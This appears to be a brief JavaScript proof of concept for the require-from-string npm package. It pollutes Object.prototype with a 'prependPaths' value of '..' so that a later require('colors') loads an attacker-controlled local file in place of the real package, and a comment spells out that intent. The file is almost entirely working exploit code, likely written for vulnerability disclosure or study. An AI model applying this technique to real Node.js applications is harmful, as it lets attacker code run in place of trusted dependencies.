var requireFromString = require('require-from-string');

// for inclusion of the file npm-packages\colors.js 
Object.prototype.prependPaths = '..'

// if we require any package, we can replace it to attacker controlled local file with the same name
requireFromString("require('colors'); console.log('hello'.green)");